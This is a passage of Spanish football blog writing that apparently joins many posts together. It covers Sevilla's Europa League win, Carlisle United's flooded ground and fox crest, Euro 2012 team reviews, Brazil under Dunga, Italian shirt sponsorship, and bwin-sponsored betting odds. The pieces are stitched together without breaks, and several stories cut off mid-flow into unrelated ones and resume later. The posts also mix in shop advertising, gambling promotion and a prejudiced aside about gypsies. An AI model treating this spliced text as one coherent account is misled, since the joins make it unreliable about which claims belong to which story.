Lo hace encantado, ante el asombro y el estupor de todos las ‘personas normales’ que forman el resto del equipo.Muy especial tiene que ser un guardameta para acabar siendo ídolo de infantes. En mis tiempos, Arconada. Actualmente, Casillas. Lo siento pero no me salen más. Los niños no quieren ser porteros porque los porteros no ganan balones de oro y, salvo que estén en el foco de una campaña mediática, no ocupan portadas ni noticieros. Porque casi nunca se habla de lo que acertó un portero, sino de lo que falló un delantero. Todo por demonizarlos un poco más. Por hacerlos más raros de lo que ya son. Quizá tú, que estás leyendo esto, seas uno de ellos. Seguro que sabes bien de lo que te estoy hablando.En el inmenso catálogo de Classic Football Shirts, la tienda online especializada en camisetas de fútbol, puedes encontrar cerca de mil quinientos modelos diferentes de jerseys de portero de todo el mundo. Me costaba no imaginar a un Sevilla campeón. Me costaba dejar de creer en el cuarto título europeo de un equipo que ya se ha convertido en legendario a base de éxitos continentales. Ni siquiera con el tempranero gol de Kalinic que ponía en ventaja al Dnipro cuando aún no se habían cumplido diez minutos de juego vi peligrar la lluvia de confetti blanco y rojo. Porque algo tiene este Sevilla que llega a las finales y se engrandece. Las juego como un equipo de peso, como el rival a batir, como un grande. Y todo bajo un halo de absoluta seguridad en lo que hace. Aferrado a un plan infalible que se articula sobre el convencimiento de que allá donde no llegue con el buen fútbol lo aupará la pasión con la que disputa esas finales. Eso que solemos llamar ‘saber competir’. Ni siquiera un percance como el gol ucraniano apea al Sevilla, equipo de altísimo ritmo, de su fe. Porque bajo el mando de Unai Emery, al que le costó no poco trabajo ganarse el corazón y la confianza del sevillismo, parece imposible tambalearse. Guiados por él, sus futbolistas resultan mejores. Mbia y, especialmente, Krychowiak alcanzan talla de referencia mundial. Banega ha dejado por fin de ser aquel jugador intermitente y anestesiado por una indolencia nefasta para convertirse en el catalizador ideal de la ofensiva sevillista. Aleix Vidal es ya pieza codiciada por equipos aspirantes a todo. A Iborra se lo reinventó, sacando de él un llegador con una fuerza descomunal y una capacidad goleadora que parecía haber dejado enterrada desde sus tiempos de categorías inferiores. Y qué decir de Carlos Bacca, de nuevo decisivo con sus dos goles al Dnipro, futbolista que ha multiplicado su cotización a las órdenes de Unai. No se trata simplemente de motivación. Se trata de llegar a ese nivel de motivación a través de juego y, claro está, resultados que avalen el juego y convenzan a quien lo desarrolla de que es el camino directo al triunfo.El Sevilla reina en la Europa League con cuatro títulos en la última década. Más que ningún otro club. Y lo hace con una naturalidad que abruma. Como si levantar la copa al cielo de Varsovia, de Eindhoven, de Glasgow o de donde quiera que le toque levantarla, fuese sencillo. Ha asumido una misión que parece más propia de equipos de mayor cilindrada con la tranquilidad del que quiere dar un salto cualitativo y quiere cambiar de bombo en los sorteos.Siento cierta envidia sana de lo que han sido capaces de conseguir y de ver en lo que han sido capaces de convertirse. Es como para que la Giralda presuma orgullosa.Puedes comprar camisetas del Sevilla FC, desde los años noventa hasta hoy, en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Thievy Bifouma (Saint-Denis, Francia, 1992) no es un futbolista al que los niños quieran parecerse. Más allá de su extravagante y desenfadado aspecto, su rendimiento habitual difícilmente podría situarle entre los escogidos. Es inconstante, inestable e inconsciente. Inconsciente, al menos, de hasta dónde podría llevarlo su potencial. Porque cuando a Thievy le da por jugar, cuando le da por ofrecer una de esas tardes como la del pasado domingo ante el Eibar, queda patente que si esas actuaciones se produjesen con mayor frecuencia el franco-congoleño aspiraría a hacer carrera en equipos que pelean por metas mayores. Pero Thievy es como es. Un prodigio de fuerza y potencia al que le da pereza exhibirse de manera regular y que a sus casi veintitrés años no parece, de momento, dispuesto a aprovechar ninguna de las oportunidades de triunfar que su talento le ha ido procurando desde que debutase bien jovencito en el fútbol profesional.Tal vez Thievy sea un lujo para la UD Almería. Puede que la manifiesta evanescencia del atacante criado en el Racing de Estrasburgo suponga un capricho que un club de las apreturas y urgencias del almeriense no pueda permitirse. Porque no resulta rentable aparecer como una de las dos referencias ofensivas del equipo (junto a Tomer Hemed) y presentar una paupérrima credencial de dos goles en en un total de veinticinco partidos ligueros. Una cifra muy alejada de lo que se espera de un jugador como él. En el horizonte languidece su fenomenal año en Las Palmas, hoy ya lejano después de las tres últimas y desconcertantes experiencias en Espanyol (repescado y renovado tras su fenomenal año en Canarias), West Brom y Almería. Y desconcierta que un futbolista capaz de firmar una temporada tan notable como aquella no haya sido capaz de mantener el nivel en circunstancias ciertamente favorables para su rendimiento.Hoy Thievy no estará en el partido que su equipo debe disputar en el Santiago Bernabéu. Y no lo hará porque alguien, no sé si él mismo, su técnico o quién, continua considerándolo un jugador referencial y básico para las aspiraciones almerienses de conseguir salvar la categoría y decidió que forzara la suspensión por acumulación de amonestaciones para hacerla coincidir con el complicadísimo compromiso de Chamartín. Como si su concurso para lo que resta de campeonato fuera imprescindible. Como si su presencia resultara diferencial en los partidos decisivos. Hace aproximadamente un mes, el modesto Carlisle United volvía a estar en boca de todo el mundo. Las torrenciales lluvias caídas sobre el norte de Gran Bretaña anegaron su estadio de Brunton Park.Ayer Pogba tuvo una parecida y nadie reclamó su expulsión. Porque nos gusta castigar a los que ya fueron castigados antes: como las viejecitas que no quieren centros de inmigrantes en su barrio, o cuando de niños cambiábamos de calle si veíamos una pandilla de gitanos.La expulsión de Pepe es injusta. Echar la culpa al jugador es como si al Juan infiel de mi ejemplo le tuviéramos prohibido enamorarse para evitar sus futuras, y aún hipotéticas, mentiras. El fútbol es un rascacielos donde el balón sólo rueda en la planta baja. ¿Qué hay en el resto de habitaciones? Especuladores, dirigentes, scouters, vendeburras, aprovechados, periodistas, aficionados, lavadoras con ropa sucia, promesas rotas, sueños más rotos aún, dinero. Mucho dinero. Periódicos, juegos, patrocinadores, constructores, lobbys, derechos televisivos, representantes, padres, madres, hermanos, novias, mujeres, hijos, camisetas sin estrenar y más dinero. Mucho más dinero. Por eso, a veces, entre ascensores y escaleras, entre puertas de emergencia y halls, se nos olvida que en la planta baja se juega al fútbol.Esta semana es para Rosell. Un fichaje poco claro, con indicios de delito, le ha costado el puesto al presidente más votado de la historia del Barcelona. El precio de Neymar y una tela de araña de comisiones, clausulas y representantes han descabezado un club cuyos valores nada tienen que ver con este circo de mercachifles que han logrado desestabilizar una entidad que aún no ha encontrado el rumbo tras los buenos –¿podemos afirmarlo ya? - años de Laporta.El Málaga, rival del domingo en el Camp Nou, sabe perfectamente de qué hablamos. La llegada del jeque Al Thani hace unos años ha traído al club de Martiricos un desfile de fichajes y ventas, ambiciones inconclusas e impredecible futuro que está llevando a la afición a un estado de inquietud injusto con una parroquia entregada, fiel y ruidosa.Los dos equipos se juegan mucho el domingo, en el césped, en la planta baja de ese kafkiano rascacielos. El Málaga aún no tiene clara su ubicación en Primera. Tras un año precioso en Europa, con un juego milimétrico cortesía de Pellegrini toca volver a la realidad de las zonas medias y la aspiración a puestos europeos. La inapetencia que transmite Schuster sumada a una lista de fichajes dudosos en el mejor de la casos, desaprovechados en el peor, hacen que el equipo de la Costa del Sol navegue por aguas templadas alejado de la Europa League y peligrosamente cerca del descenso –a cinco puntos Valladolid y Rayo-. Se pedía una revolución en invierno y aunque se habló de Thievy, el balance de momento trae al mediocentro argentino de Newell´s Pablo Pérez y se lleva a Chen y Fabrice al fútbol belga. Al equipo le falta gol y aunque Roque Santa Cruz está rindiendo se echa de menos una alternativa arriba –¡ese perfil de Saviola! - para los partidos más cerrados, opción nueva ya que Pawlowski no parece contar para el técnico alemán y El Hamdaoui no tiene regularidad por las lesiones.El del Barcelona es otro problema. La lesiones –Valdés, Messi…- han minado la regularidad del equipo. Martino tiene una plantilla corta, descompensada y sólo el buen rendimiento de los canteranos –Bartra sobre todo, también Montoya y Sergi Roberto- está logrando que el equipo no haga aguas a estas alturas de la temporada. Van líderes, pero la cabeza de la liga está apretada con un Atleti excelso y un Real Madrid mejorando cada fin de semana. Buenas noticias para el club culé son la –por fin- acomodación de Cesc en el mediocampo y la notable mejoría de Alexis Sánchez con respecto al año pasado. El equipo tiene dudas pero una demostrada capacidad de mejora en la adversidad. Martino no tiene el brillo de Guardiola ni la idea de fútbol total de Rijkaard pero resulta un entrenador pausado, esquemático y preciso en el día a día. No es poco en un equipo demasiado dado, últimamente, al desorden táctico y la dependencia del genio argentino Messi. Apuestas en bwinEl partido parece un 1 claro, que se paga a nada (1,08 €) a día de hoy. Yo no veo tan mal al Málaga y no digo una victoria visitante, pero un empate está cotizado (10,50 €). Obviando el marcador, aceptando que el Barcelona lo tiene claro, podemos jugar con los goles: el gol de Tello –viene de un hat-trick en Copa- dobla el euro (2.00 €). El de Santa Cruz –que lleva 4 esta temporada- se paga a 5,75 €. Y ahora la apuesta excéntrica, la del marcador exacto. El 1-0 se paga a 12.00 €. Partido trabado, resultado justo, quien sabe lo que está dispuesto a hacer el Málaga con un Schuster motivado en el Camp Nou. Os dejo la sorpresa, para osados y boquerones: 41 euros se paga el 0-1 a favor del Málaga. Nadie se hace rico siendo honrado, del mismo modo que nadie adelgaza comiendo pizzas o folla sin levantarse del sofá. La vida está hecha a la medida de los pendencieros y los buscafortunas. Desde Rinconete y Cortadillo hasta el Lazarillo de Tormes, es más importante ser listo que inteligente. En la inteligencia está la debilidad de la moral. En la listeza solo hay espacio para la supervivencia.Siempre defendí que el sueldo de los futbolistas es justo: ganan tanto dinero como dinero generan y en nuestra Economía de Mercado eso es lo correcto. Ahora bien, que cumplan con sus obligaciones tributarias. Como todos. Como casi todos, porque para eludir los pagos el ser humano lleva siglos inventando excusas. Los impuestos existen por el bien común. El bien común es un estado de ánimo, como el fútbol que contaba Valdano.Los papeles de Panamá nos recuerdan lo de siempre: los multimillonarios se inventan sistemas de ocultamiento de capitales para seguir amasando su fortuna. Pelean cada monedita con más entusiasmo en el banco que en el césped. Heinze, Ulloa, Zamorano o Messi están en los documentos revelados. Aún hay que probar su culpabilidad. Ellos amenazan con querellarse contra los que han sacado los papeles. Hacienda somos todos, menos algunos. Cuando más duermes, más sueño tienes. Con los dineros pasa igual.La solución está a mano: legislación específica para grandes fortunas, aumento de las penas por delitos económicos, un apartado en pagos de clubes y empresas pantalla  y una fiscalización intensa. Ser con los futbolistas como nos enseñó Gattuso, que noten el aliento en el cogote. En este deporte se mueve tanto dinero que la sensación de dispersión y falta de rigor en el control del flujo monetario es más que palpable, pero en algún momento habría que empezar a ponerle vallas a los corderos.No es demagogia fiscal, como decía Montoro; es asfixiar a los clubes y a los jugadores en busca del bien común.El agua alcanzó alturas de tres metros, inundando no solo el césped, sino los vestuarios y gran parte del graderío. Las fotos dejan clara la magnitud de la catástrofe. Apenas unas pocas semanas después, y gracias a la inestimable aportación económica de buena parte de sus aficionados (incluso de Rod Stewart, que aportó diez mil libras para la rehabilitación del estadio), Brunton Park se vestía con sus mejores galas para albergar el emparejamiento en la cuarta ronda de la FA Cup con el Everton, disputado el pasado domingo con clara victoria (0-3) de los Toffees. Hoy recuperamos este texto sobre el origen del emblemático zorro que preside el escudo del club como particular homenaje a una entidad que se sacudió el barro en tiempo récord para poder honrar como merece a la competición de clubes más antigua del planeta.Cuando el 18 de noviembre de 2004 Su Majestad la Reina Isabel II sancionó la polémica Hunting Act que prohibía la caza del zorro en territorio de Inglaterra y Gales un suspiro de alivio recorrió sobre un elevado porcentaje de la opinión pública y de la clase política británica. La moralista sociedad anglosajona no podía seguir viendo como lo que era mayoritariamente considerado como un entretenimiento tan cruel como arcaico continuaba formando parte de la esencia british. Pese a que hubo no pocos movimientos contrarios a la ilegalización de las cacerías de zorro, la disposición entró finalmente en vigor el día 18 de febrero del año 2005. Los característicos perros foxhound ingleses, la llamativa casaca escarlata de los cazadores sobre sus caballos y los toques de corneta pasaron a mejor vida junto a toda la parafernalia social de la actividad cazadora, llevándose consigo una tradición que tuvo su momento álgido en la segunda mitad del siglo XIX.Pero si la tradicional caza del zorro era una actividad absolutamente emblemática en todo el territorio inglés, en las verdes praderas de Cumbria era religión. Allí, donde Inglaterra y Escocia se ven irremediablemente separadas, las batidas, símbolo de distinción y poderío, alcanzaban una dimensión social estratosférica y eran seguidas con un especial fervor por buena parte de la población local. La raigambre de la actividad cinegética era tal en la región que no pocas canciones populares de la zona estaban dedicadas a glosar a las leyendas locales de la caza. A John Peel (Caldbeck, Cumbria 1776-1854) la historia le recuerda como un extraordinario cazador y un destacado criador de foxhounds de caza. Es una figura de referencia en su región de origen. Tanto es así, que hasta tiene dedicada una canción recordando sus hazañas, “D’ye ken John Peel? “ (“¿Conoces a John Peel? “), una tonadilla popular habitual en ciertos círculos de la región de Cumbria y de la vecina Escocia. Pero no solo eso. Como suele ser habitual en tierras inglesas, John Peel también tiene su particular impronta en el equipo de fútbol de la capital de la región, el Carlisle United FC.Fundado en 1904, no fue hasta finales de la década de los sesenta cuando el club tomó la decisión de adoptar un zorro rojo como emblema, en tradicionalista recuerdo de John Peel y de los múltiples Fox-Hunters oriundos de la región. La figura del zorro se llegó a emplear como escudo en las equipaciones del equipo e incluso, mediada la década de los setenta, un pequeño zorro rojo, de nombre Olga (nombre procedente de la alteración de las letras de la palabra ‘Goal‘) era paseado con una correa al cuello por el césped de Brunton Park en los minutos previos a la disputa de los partidos como local del Carlisle. Felizmente, hoy Olga the Fox no es más que un aficionado local embutido en un apañado disfraz de zorro vestido con la camiseta del equipo. Los tiempos cambian que es una barbaridad.En Cumbria ya no hay zorros en cautividad. Ya no hay zorros perseguidos hasta caer extenuados (al menos no de manera legal y conocida). Sin embargo, hay tradiciones que permanecen indefectiblemente ligadas a la memoria local. Aunque sea a través de un simpático zorrito en una recóndita esquina de la camiseta del equipo de fútbol local.Puedes comprar camisetas del Carlisle United en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Alemania es campeona del mundo. Con la generación de los Kroos, Götze, Müller, Özil o Neuer revive la leyenda de la Alemania potente, la Alemania que asusta, el equipo blindado con capas de acero y wolframio y la camiseta que pesa y que gana partidos casi simplemente saltando al césped. La Mannschaft llegó al Mundial de Francia en 1998 apuntando hacia un ocaso evidente e inevitable. Con un seleccionado con la veteranía como denominador común, la virtud de la experiencia acabó convirtiéndose en el vicio de la apatía y la pesadez de piernas. Era el equipo de Lottar Matthäus, Andy Köpke, Jürghen Kohler, Thomas Helmer, Andy Möller y Jürgen Klinsmann, todos ellos ilustres campeones de Europa en el 96 con notable exceso de kilometraje en sus marcadores. La rígida y tradicionalista selección alemana del 98, dirigida por el no menos tradicional Berti Vogts, acabó sucumbiendo en Gerland en cuartos de final ante una joven y arrolladora selección croata (3-0), revelación de aquel torneo. Fue el gran aviso de que el modelo presentaba ya síntomas de caducidad y de que urgía una profunda remodelación del sistema futbolístico germano. Euro 2000. Dos años más tarde, ante el inmovilismo alemán, el petardazo era ya un hecho. Alemania no pasaba de primera fase.Apremiada por su inmediata condición de anfitriona del torneo de 2006, Alemania empezó a dar muestra de cambio y mejoría en el torneo asiático del año 2002.Cuartos de final. Una victoria, un empate y dos derrotas; cinco goles anotados y siete recibidos. Goleadores: Salpingidis (2), Gekas, Karagounis y Samaras.Lo mejor. El carácter, esa línea invisible que unió a la selección helena con la campeona de 2004, y que permitió extraer petróleo de una de las plantillas más limitadas de la competición. Todos sufrieron contra ellos.Lo peor. Una incapacidad para el toque que movía casi a la piedad, la inoperancia en la derecha de Ninis, que va atufando cada vez más a eterna promesa, y el penalti fallado frente a Polonia, que hubiera sentenciado una de las grandes sorpresas del torneo.La estrella. A sus 35 años y en su último gran torneo internacional, Giorgios Karagounis volvió a ser el faro que guió a la selección mediterránea hacia donde nadie pensaba que llegarían. Su ausencia en el cuarto de final tuvo mucho que ver con la descomposición final del equipo.El momento. El gol de Karagounis contra Rusia, un nuevo milagro si pesamos libra a libra la capacidad técnica de los futbolistas de uno y otro equipo. Uno de los highlights de la Euro.Rusia. Primera fase. Una victoria, un empate y una derrota; cinco goles marcados y tres encajados. Goleadores: Dzagoev (3), Shirokov y Pavlyuchenko.Lo mejor. El precioso juego mostrado en el partido contra Chequia, que trajo agradables recuerdos del fantástico equipo de hace cuatro años, y que les colgó algo apresuradamente el papel de favoritos.Lo peor. La irregularidad de sus jugadores, personificada en ese Arshavin que desperdicia su talento a manos llenas, y una cierta falta de combatividad cuando las cosas se pusieron feas frente a Polonia y Chequia.La estrella. Años después de que los focos lo saludaran como estrella en ciernes, y cuando ya nos estábamos olvidando un poco de él, apareció Alan Dzagoev para recordarnos que sólo tiene 22 años y que sigue siendo uno de los mediapuntas más talentudos de su generación. Pichichi ex–aequo.El momento. Quizá el portentoso gol de Pavlyuchenko en el primer partido marcó el punto álgido de los rusos en la Euro, así como nos devolvió un fogonazo de otro futbolista que creíamos perdido. Tras él casi todo fueron malas noticias. Polonia. Primera fase. Dos empates y una derrota, con dos goles marcados y tres encajados. Goleadores: Lewandowski y Blaszczcykowski.Lo mejor. El primer tiempo del primer partido, en el que borraron a Grecia del mapa y por momentos se previó la goleada, el cuajo de Tyton tras la expulsión de Szczesny, y los arrestos para empatarle a Rusia en un encuentro muy importante para su gente.Lo peor. Pocas cosas hay que resulten tan ridículas en fútbol como un equipo defensivo que no defiende bien. Algo de eso le ha pasado a Polonia, atrincherada en muchas fases de sus partidos a pesar de enfrentarse con equipos –excepto Rusia- de parecido potencial. No es raro que Smuda no haya renovado.La estrella. En un equipo que ha mostrado un perfil bajo en ocasiones alarmante, quizá lo más relevante han sido las carreras de Kuba Blaszczcykowski, quizá el único futbolista capaz de asumir la responsabilidad de su equipo en los peores momentos.El momento. Sin duda, el momento en el que el propio Kuba enganchó el balón para soltar el zapatazo que equilibró el duelo con Rusia. Fue el mejor momento vivido por los seguidores polacos en la Eurocopa. Llegó Dunga, y se terminó la estafa del jogo bonito. Hasta el último Mundial, cada vez que se avecinaba un partido de Brasil teníamos que soportar a una legión de cantamañanas, anunciantes y expertos zorros en marketing cantando las excelencias del sin par juego carioca, fantasía, belleza y alegría todo uno, samba en el campo y disfrute para los ojos. Un festival de luz y color que duraba exactamente hasta que el árbitro daba el pitido inicial, momento en que un ejército de mastodontes vestidos de amarillo invadían el campo, y muy especialmente el centro del mismo y su defensa, para hacer imposible cualquier incursión del rival y trasladar el balón a un par de artistas solitarios que resolviesen el encuentro en un par de fogonazos. Este concepto tan particular del juego bonito ha llevado a la canarinha a dos campeonatos del mundo en los últimos veinte años (uno menos que en el periodo 58-70, por cierto), a la vez que ha generado una cierta corriente de frustración entre los que nos sentábamos frente al televisor pretendiendo contemplar a los sucesores de Garrincha y Pelé o las sinfonías del 70 y el 82 y nos marchábamos de allí sintiéndonos estafados por la diferencia entre lo que habíamos visto y lo que nos habían vendido.La verdad es que resulta preferible lo que vamos a encontrar en la actualidad. A Carlos Caetano Bledorn Verri, más conocido como Dunga por su poca estatura, leyenda donde las haya de Brasil y sargento de hierro en la mejor línea de la película de de Kubrick, se le podrán achacar muchas cosas, pero desde que llegó al cargo en 2006 no ha engañado a nadie: él quería un equipo poderoso físicamente, construido desde la defensa e impenetrable en el medio, con dos o tres atacantes liberados que se ocupasen de meter, al menos, un gol. Como fuese el primero en proclamar como ideario lo que llevaban realizando sus predecesores muchos años de modo camuflado, le llovieron palos de todo tipo, hasta que al olor de la Copa América de 2007 arrimó a su ascua a los ganadores de vocación a la vez que silenció a los estetas. Hoy Brasil es una selección europea de corte italianizado, y con esta organización -que los jugadores han asumido como un solo hombre- presenta una candidatura al título cuando menos sólida.Y es que si algo reconocen todos los analistas es que el mecano que ha montado Dunga –con jugadores, justo es reconocerlo, que no están en general a la altura de los de antaño- constituye una roca que es dificilísimo afrontar. Desde Julio César, a quien muchos consideran con argumentos de peso el mejor portero del mundo, hasta ese Luis Fabiano que llega descansadísimo al Mundial, Brasil ofrece un dechado de poderío y experiencia que promete convertir los partidos en un infierno para los rivales. Con Juan y Lucio aportando de nuevo fortaleza y veteranía a partes iguales en el centro de la defensa, el eterno Gilberto Silva y Felipe Melo cerrando el tráfico en el medio –quizá con el apoyo en momentos puntuales de Josué o Kleberson-, y la potencia en movimiento de la bestia Baptista entrando en el área como un bisonte, tendrán que tener un gran día los Cristiano, Touré o Kalou de turno para sobrevivir en el campo de minas que va a plantear la canarinha. De Corea del Norte ni hablamos, claro.Y si así son las cosas, ¿qué podemos esperar de bonito, sutil o ligero los que aún mantenemos esa llamita de esperanza del mismo color de la camiseta de la seleçao? Teóricamente, los hechiceros de guardia son Robinho y Kaká, y si bien para el primero podemos traer a la memoria incluso un buen semestre en el Madrid y algunos partidos al comienzo de su etapa en el City –hablamos de aventura europea, claro-, los primeros conceptos que acuden a la cabeza si uno piensa en el futbolista más protegido por el periodismo deportivo español son los de timo, jugador en la cuesta abajo, o, al menos en los últimos dos años, sobrevaloración galopante. La verdad es que no lo tiene nada fácil Kaká en este mundial, ya que si juega mal porque juega mal, y si juega bien porque se ha reservado, será difícil que satisfaga a gran parte del respetable. Quizá mejor olvidarse de estas consideraciones y disfrutar de los detalles, pocos o muchos, que deje este futbolista a quien nadie puede negarle la elegancia dentro y fuera del campo. De él y de Robinho dependerá el rendimiento ofensivo de Brasil, y también de los laterales: Maicon o Alves en la derecha, mejores ambos del mundo en su puesto, e influyentes globalmente, y de Bastos en la izquierda, si es que Dunga se atreve en competición con su curioso experimento. En cualquier caso, nos guste más o menos, un gran equipo, que parte al menos con el mismo favoritismo que cualquier selección brasileña del pasado.Lo mejor: la implicación de todos los futbolistas en el proyecto y la competitividad de la selección. Lo peor: que nos acordemos del prototipo de Brasil.Jugador a seguir: el lateral diestro, sea el que sea, y Luis Fabiano, ya que la posición del nueve es capital en los esquemas de Dunga.Pronóstico DDF: semifinales o final.Porteros: – Julio César (Inter de Milán)– Doni (AS Roma)– Gomes (Tottenham Hotspur)Defensas: – Maicon (Inter de Milán)– Daniel Alves (FC Barcelona)– Michel Bastos (Olympique de Lyon)– Gilberto (Cruzeiro)– Lucio (Inter de Milán)– Juan (AS Roma)– Luisao (Benfica)– Thiago Silva (AC Milan)Medios: – Gilberto Silva (Panathinaikos)– Felipe Melo (Fiorentina)– Ramires (Benfica)– Elano (Galatasaray)– Kaká (Real Madrid)– Julio Baptista (Roma)– Kleberson (Flamengo)– Josue (VfL Wolfsburgo)Delanteros: – Robinho (Manchester City)– Luis Fabiano (Sevilla)– Nilmar (Villarreal)– Grafite (VfL Wolfsburg). Real Betis-Real Madrid. Vuelve el Madrid a Villamarín después de varios años, para enfrentarse a un Betis que ya le puso las cosas difíciles en el Bernabéu, a pesar del 4-1 final. El equipo sevillano está dejando buen poso en la Liga, de equipo combinativo y de buen gusto, aunque el propio Pepe Mel manifieste que esas características no le benefician en exceso para enfrentarse al líder. La derrota ante el Levante truncó una racha de tres partidos sin perder, y en el partido de hoy (22:00 h.) Mel deberá recomponer una defensa afectada por las bajas de Paulao y Álvarez y la duda de Amaya. Su rival vive una cierta calma chicha, tras una semana sin fútbol y el CSKA en el horizonte. La principal noticia es la vuelta de Benzema, serio candidato al título de mejor jugador del equipo esta temporada, que quizá tenga unos minutos sobre el césped de Heliópolis. Su concurso en los meses restantes se adivina crucial para el Real.En bwin se paga a 1.45 la victoria del Real Madrid, una cuota de apuestas muy interesante si observamos la tremenda racha de los blancos; el empate va a 4.33 y la victoria a 6.75. Interesante considerar la posibilidad de que marque Roque Santa Cruz (cuota 17.00) que se motiva especialmente contra los grandes.Cada semana, y de la mano de bwin, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Racing-Barcelona.Hasta finales de los setenta los italianos pudieron decir con propiedad que sentían los colores; en 1981 llegaron las pegatinas. Algo sospechaban pero nada semejante al verano del 81. Entonces la camiseta de la Juventus se convirtió en un anuncio de  lavadoras, la del Inter empezó a vender televisores y la de la Roma spaghetti.El año explosivo del patrocinio textil en la Serie A infló de liras el mercado con resultados desiguales y dejó una sartenada interminable de camisetas inolvidables. El escocés Joe Jordan, que hizo la friolera de dos goles en 22 partidos con el Milan, fue el paradigma de lo primero; la camisa de la Fiorentina con la publicidad de J.d Farrow’s, de lo segundo. Más que patrocinio fue invasión; más que viola fue violada.Flavio Pontello era el patrón de una saga de industriales que había hecho fortuna construyendo las principales autopistas del país tras la segunda guerra mundial. Ese mismo año compró el club para convertirlo en una empresa tan boyante como su propio negocio y más tarde fichó a fenómenos como Socrates o Roberto Baggio. No se le daban mal los negocios pero, antes de todo eso, no tardó en aplicarse para aportar la primera ocurrencia. La camiseta viola debía ser algo único, artístico y audaz. Que les emparentara más con cierta nobleza cultivada (él mismo sería nombrado conde años después) que con la imaginería engrasada de la Juve o el Torino. Así alumbró el patrocinio más extraño del fútbol italiano, permitiendo a una marca de pantalones vaqueros profanar el escudo de la sociedad, que para colmo es el propio emblema de Florencia. El lirio pasaba a ser una F como una catedral.Por mucha planta que le echara Passarella al posado, la extravagancia sentó como un tiro en la curva del Franchi, las quejas fueron sonoras, y la camiseta Farrows tuvo que criar polvo en un cajón durante décadas hasta acabar convirtiéndose en el fetiche de culto que es. Tampoco ayudó que aquel equipo perdiera la liga calamitosamente, por tan solo un punto de diferencia, contra la Juventus, eterno rival. Los de Turín sin Bettega casi todo el año y la Fiore, sin Antognoni se las apañaron para llegar empatados a la última jornada; entonces las lavadoras hicieron lo que suelen.Nunca en los últimos años se ha fracturado tanto el Barça como equipo de su famoso entorno. En lo deportivo, la maquinaria vuelve a estar engrasada una vez que Guardiola ha recuperado a un equipo titular que sometió a Valencia y Atleti y destrozó, Messi mediante, al Bayer Leverkusen. En el otro lado, en cambio, se desarrolla un torbellino de declaraciones extemporáneas que ensucian el ambiente y quitan lustre al club; las últimas, de Godall, especialmente graves por lo que implican de la limpieza de la competición. Este ambiente es el que rodea al equipo que visitará el Sardinero (domingo, 18:00), donde el Racing al que estafó el entrañable Ali se debate en un caos de difícil solución que apunta hacia abajo. Roto el triunvirato por los malos resultados, mañana se estrena Álvaro Cervera en el banquillo. Tiene por delante una tarea titánica.Si Guardiola saca a su equipo de gala, es muy factible pensar en la goleada azulgrana: un 0-3 se paga a 10.50, 0-4 a 26. También da mucho dinero el empate (5.75) y no digamos la victoria local (13.75). Como curiosidad, la cuota por gol de Messi es irrisoria (1.25), a pesar de que apenas ha visto puerta este año en Liga fuera de casa. Ojo, que si abre el marcador se paga a 2.75, y lo mismo si lo cierra. Para pensarlo.Sporting-Sevilla. Quizá el punto de interés más morboso de la jornada sea el Molinón, donde el Sevilla visita al Sporting. Puede ser que las nuevas generaciones no lo recuerden, pero el debate que generó la presencia o no de Míchel en la selección cuando Clemente la entrenaba convierte el actual debate sobre Torres en charla de peluquería. Son dos personalidades irreconciliables, que defienden diferentes tipos de fútbol, se identifican con dos clubes rivales y han cobijado un rencor hacia el otro que lleva durando ya muchos años. El Sporting aún no ha ganado con Clemente, y tras un cierto repunte de actitud no dejó muy buena impresión la pasada semana ante un Barça herido y con diez; en cambio, Míchel sí ha sabido insuflar optimismo en sus primeras semanas junto al Guadalquivir, y la percepción es que su equipo crece y se ha quitado de encima la nube negra de los últimos tiempos de Marcelino. Mañana sábado a las ocho de la tarde.Aquí pueden considerarse factibles las tres posibilidades: victoria asturiana (3.25), empate (3.25) o victoria del Sevilla (2.20). Un solo gol del Sporting en el primer tiempo se paga a 2.90, del Sevilla a 2.60. Atención a la posibilidad de que marque Navas, muy bien en los últimos partidos, que se sitúa en 9.00.Osasuna-Athletic Club. Otro partidazo se jugará a las 21:30 en el antiguo Sadar de Pamplona,  un Osasuna-Athletic que no es un derbi pero se le acerca. Partido interesante entre un equipo que se ha fortalecido profundizando en su forma tradicional de jugar, frente a otro que lo ha hecho cambiándola diametralmente. El choque se presenta muy peligroso para los leones, primero porque Pamplona es siempre una plaza difícil –pocos equipos como el rojillo para hacer saber al rival lo que es la ventaja de campo-, segundo por la dificultad de mentalizarse tras la euforia de Old Trafford, y tercero por el cansancio que pueden arrastrar los jugadores tras un esfuerzo descomunal, y que obligará a Bielsa a realizar cambios en un once que no varía casi nunca. En Osasuna es baja Lekic, duda Marc Bertrán, y la noticia de la semana ha sido la operación de rodilla de Kike Sola, para quien ha acabado el curso. Suerte y ánimo para el chaval.Atención especial aquí a la posible sorpresa de Osasuna: 2.80 la victoria, 3.20 el empate, mientras que la victoria bilbaína se paga a 2.50. Se puede jugar un 1X, con 2.10 si hay empate y ninguna pérdida en caso de triunfo osasunista. Si pensamos que el Athletic llegará pletórico y se impondrá sin problemas, recordemos el 8.50 para el gol de Llorente, y el 11.50 para el de Toquero, presunto titular. Ojo. Da igual que sea el torneo ninguneado por antonomasia. Lo mismo da que se juegue de forma casi clandestina, que su sistema de competición la haya diseñado algún enemigo del fútbol, o que demasiado a menudo sea el torneo de los suplentes. La Copa tiene sus propias leyes, y todos los años nos ofrece un puñado de partidos para recordar. Ayer tuvimos quizá los diez minutos más locos del año aliñados con la salsa de la remontada y la especia del fallo garrafal –pobre Zubikarai-,  y la gran sensación del Segunda B que graba su nombre en el torneo para que ya no lo olvidemos. Hoy, un partido macho en el Pizjuán con goles en el segundo tiempo (2-1), como mandan los cánones del torneo, y minutos finales de terrible intensidad con el Valencia achicando agua para lograr el premio. El Español ha prolongado la euforia del domingo a base de vértigo y presión; lo que atropelló al Barça ha servido para derribar al Córdoba (4-2), aunque los andaluces han vendido caro su pellejo en la segunda mitad. Álvaro Vázquez hat-trick en la semana de su vida. El partido con menos historia, el del Levante, que se ha creído de verdad que es el Grupo Salvaje y ha arrollado al Alcorcón (4-0). Y en lontananza, en una semana, hay… lo que hay. Viva la Copa. Estudiar un tema hasta la saciedad, hasta el punto de la obsesión, lo convierte a uno muchas veces -no siempre- en un experto en el asunto. Se estudian los antecedentes, los precedentes, las circunstancias, los desarrollos, las conclusiones, la bibliografía y hasta la vestimenta del personal involucrado en el tema. Uno dedica horas, días, semanas, mañana, tarde y noche a adentrarse en los recovecos de lo que le interesa, y en 